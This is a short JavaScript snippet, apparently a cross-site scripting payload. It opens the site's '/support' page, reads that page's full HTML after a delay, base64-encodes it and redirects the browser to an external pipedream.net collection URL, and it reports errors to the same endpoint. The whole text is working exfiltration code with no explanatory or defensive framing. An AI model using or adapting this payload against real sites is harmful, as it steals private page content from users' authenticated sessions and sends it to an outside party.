(async function(){
  const END = "https://eoeipamgnflz15n.m.pipedream.net";

  function safeB64(s){
    try { return btoa(unescape(encodeURIComponent(String(s)))); }
    catch(e){ return btoa(String(s)); }
  }

  const url = "/support";
  try {
	const a = window.open("/support");
	setTimeout(() => {
	  try {
		const content = a.document.documentElement.outerHTML; 
		document.location = END + '/ok?'+ btoa(content)
	  } catch (err) {
		document.location = END + '/error_skv'
		console.error("Impossible d’accéder au contenu :", err);
	  }
	}, 2000);
		
	
  } catch (err) {
    const payload = encodeURIComponent(safeB64(String(err && err.stack ? err.stack : err)));
    document.location = END + "?err=" + payload;
  }
})();
